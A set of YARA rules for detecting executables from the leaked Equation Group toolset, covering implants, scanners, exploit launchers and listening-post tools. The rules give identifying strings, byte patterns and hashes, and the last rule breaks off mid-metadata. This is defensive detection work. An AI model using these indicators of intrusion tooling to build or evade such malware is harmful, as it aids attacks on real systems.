rule EquationGroup_Toolset_Apr17_greatdoc_dll_config_RID39AF : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fd9d0abfa727784dd07562656967d220286fc0d63bcf7e2c35d4c02bc2e5fc2e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Projects\\GREATERDOCTOR\\trunk\\GREATERDOCTOR" ascii
      $x2 = "src\\build\\Release\\dllConfig\\dllConfig.pdb" ascii
      $x3 = "GREATERDOCTOR [ commandline args configuration ]" fullword ascii
      $x4 = "-useage: <scanner> \"<cmdline args>\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_scanner_RID34E0 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f180bdb247687ea9f1b58aded225d5c80a13327422cd1e0515ea891166372c53"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "+daemon_version,system,processor,refid,clock" fullword ascii
      $x2 = "Usage: %s typeofscan IP_address" fullword ascii
      $x3 = "# scanning ip  %d.%d.%d.%d" fullword ascii
      $x4 = "Welcome to the network scanning tool" fullword ascii
      $x5 = "***** %s ***** (length %d)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std_RID3836 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "087db4f2dbf8e0679de421fec8fb2e6dd50625112eb232e4acc1408cc0bcd2d7"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 } 
      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 } 
      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_tacothief_RID35AD : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c71953cc84c27dc61df8f6f452c870a7880a204e9e21d9fd006a5c023b052b35"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "File too large!  Must be less than 655360 bytes." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_ntevt_RID3427 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "c:\\ntevt.pdb" fullword ascii
      $s1 = "ARASPVU" fullword ascii
      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } 
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } 
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )
}

rule EquationGroup_Toolset_Apr17_EpWrapper_RID358C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8eed17665ee22198670e22458eb8c9028ff77130788f24f44986cce6cebff8d"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* Failed to get remote TCP socket address" fullword wide
      $x2 = "* Failed to get 'LPStart' export" fullword wide
      $s5 = "Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_2000_RID372D : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:27:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f9ea8ff5985b94f635d03f3aab9ad4fb4e8c2ad931137dba4f8ee8a809421b91"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "0M1U1Z1p1" fullword ascii
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } 
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } 
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )
}

rule EquationGroup_Toolset_Apr17_DllLoad_Target_RID3758 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a42d5201af655e43cefef30d7511697e6faa2469dc4a74bc10aa060b522a1cf5"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "BzWKJD+" fullword ascii
      $op1 = { 44 24 6c 6c 88 5c 24 6d } 
      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 } 
      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_EXPA_RID3324 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2017176d3b5731a188eca1b71c50fb938c19d6260c9ff58c7c9534e317d315f8"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* The target is IIS 6.0 but is not running content indexing servicess," fullword ascii
      $x2 = "--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL" fullword ascii
      $x3 = "By default, the shellcode will attempt to immediately connect s$" fullword ascii
      $x4 = "UNEXPECTED SHELLCODE CONFIGURATION ERRORs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DS_ParseLogs_RID367C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0228691d63038b072cdbf50782990d505507757efbfa87655bb2182cf6375956"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* Size (%d) of remaining capture file is too small to contain a valid header" fullword wide
      $x2 = "* Capture header not found at start of buffer" fullword wide
      $x3 = "Usage: %ws <capture_file> <results_prefix>" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Oracle_Implant_RID3780 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8e9be4960c62ed7f210ce08f291e410ce0929cd3a86fe70315d7222e3df4587e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 } 
      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 } 
      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DmGz_Target_RID362E : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5964966041f93d5d0fb63ce4a85cf9f7a73845065e10519b0947d4a065fdbdf2"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii
      $s3 = "6\"6<6C6H6M6Z6f6t6" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_drivers_Implant_RID3829 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ee8b048f1c6ba821d92c15d614c2d937c32aeda7b7ea0943fd4f640b57b1c1ab"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "hZwLoadDriver" fullword ascii
      $op1 = { b0 01 e8 58 04 00 00 c3 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
}

rule EquationGroup_Toolset_Apr17_ntfltmgr_RID3564 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3df61b8ef42a995b8f15a0d38bc51f2f08f8d9a2afa1afc94c6f80671cf4a124"
      hash2 = "f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5"
      hash3 = "980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw" fullword ascii
      $s6 = "w+w;w2w0w6w4w.w(wRw" fullword ascii
      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 } 
      $op2 = { ff 15 0b 34 00 00 eb 92 } 
      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae } 
      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 } 
      $op5 = { 8a 40 01 00 c7 47 70 } 
      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 } 
      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_RID36F5 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ae9a247b60dc31f424e8a7a3b3f1749ba792ff1f4ba67ac65336220021fce9f"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 } 
      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba } 
      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_LP_RID3384 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3a505c39acd48a258f4ab7902629e5e2efa8a2120a4148511fe3256c37967296"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "* Failed to get connection information.  Aborting launcher!" fullword wide
      $s2 = "Format: <command> <target port> [lp port]" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_RemoteCommand_Lp_RID383C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "57b47613a3b5dd820dae59fc6dc2b76656bd578f015f367675219eb842098846"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Failure parsing command from %hs:%u: os=%u plugin=%u" fullword wide
      $s2 = "Unable to get TCP listen port: %08x" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_lp_mstcp_RID3558 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:09:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2ab1e1d23021d887759750a0c053522e9149b7445f840936bbc7e703f8700abd"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" wide
      $s2 = "_PacketNDISRequestComplete@12\"" fullword ascii
      $s3 = "_LDNdis5RegDeleteKeys@4" ascii
      $op1 = { 89 7e 04 75 06 66 21 46 02 eb } 
      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 } 
      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( all of ( $s* ) or all of ( $op* ) ) )
}

rule EquationGroup_Toolset_Apr17_renamer_RID34E0 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c30331cb00ae8f417569e9eb2c645ebbb36511d2d1531bb8d06b83781dfe3ac"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "FILE_NAME_CONVERSION.LOG" fullword wide
      $s2 = "Log file exists. You must delete it!!!" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_Exploit_RID35CD : APT DEMO EXE EXPLOIT FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:28:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0"
      tags = "APT, DEMO, EXE, EXPLOIT, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\\\.\\pipe\\pcheap_reuse" fullword wide
      $s2 = "**** FAILED TO DUPLICATE SOCKET ****" fullword wide
      $s3 = "**** UNABLE TO DUPLICATE SOCKET TYPE %u ****" fullword wide
      $s4 = "YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this..." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_put_Implant9x_RID3734 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8fcc98d63504bbacdeba0c1e8df82f7c4182febdf9b08c578d1195b72d7e3d5f"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "3&3.3<3A3F3K3V3c3m3" fullword ascii
      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 } 
      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_promiscdetect_safe_RID396A : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6070d8199061870387bb7796fb8ccccc4d6bafed6718cbc3a02a60c6dc1af847"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "running on this computer!" fullword ascii
      $s2 = "- Promiscuous (capture all packets on the network)" fullword ascii
      $s3 = "Active filter for the adapter:" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PacketScan_Implant_RID3907 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9b97cac66d73a9d268a15e47f84b3968b1f7d3d6b68302775d27b99a56fbb75a"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff } 
      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 } 
      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
}

rule EquationGroup_Toolset_Apr17_SetPorts_RID353A : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "722d3cf03908629bc947c4cca7ce3d6b80590a04616f9df8f05c02de2d482fb2"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]" fullword ascii
      $s2 = "Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_msgks_mskgu_RID36A1 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:04:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7b4986aee8f5c4dca255431902907b36408f528f6c0f7d7fa21f079fa0a42e09"
      hash2 = "ef906b8a8ad9dca7407e0a467b32d7f7cf32814210964be2bfb5b0e6d2ca1998"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } 
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } 
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Ifconfig_Target_RID37E1 : APT DEMO EXE FILE T1543_003 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1ebfc0ce7139db43ddacf4a9af2cb83a407d3d1221931d359ee40588cfd0d02b"
      tags = "APT, DEMO, EXE, FILE, T1543_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\%hs" fullword wide
      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 } 
      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_RID360C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ffff3526ed0d550108e97284523566392af8523bbddb5f212df12ef61eaad3e6"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } 
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } 
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Dsz_Implant_RID365B : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fbe103fac45abe4e3638055a3cac5e7009166f626cf2d3049fb46f3b53c1057f"
      hash2 = "ad1dddd11b664b7c3ad6108178a8dade0a6d9795358c4a7cedbe789c62016670"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%02u:%02u:%02u.%03u-%4u: " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_GenKey_RID3439 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b6f100b21da4f7e3927b03b8b5f0c595703b769d5698c835972ca0c81699ff71"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "* PrivateEncrypt -> PublicDecrypt FAILED" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_clocksvc_RID354E : APT DEMO EXE FILE T1543_003 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1"
      tags = "APT, DEMO, EXE, FILE, T1543_003"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "~debl00l.tmp" fullword ascii
      $x2 = "\\\\.\\mailslot\\c54321" fullword ascii
      $x3 = "\\\\.\\mailslot\\c12345" fullword ascii
      $x4 = "nowMutex" fullword ascii
      $s1 = "System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate" fullword ascii
      $s2 = "000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98" ascii
      $s3 = "00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of ( $s* ) ) )
}

rule EquationGroup_Toolset_Apr17_yak_min_install_RID3834 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f67214083d60f90ffd16b89a0ce921c98185b2032874174691b720514b1fe99e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "driver start" fullword ascii
      $s2 = "DeviceIoControl Error: %d" fullword ascii
      $s3 = "Phlook" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_SetOurAddr_RID35D3 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:29:41"
      score = 75
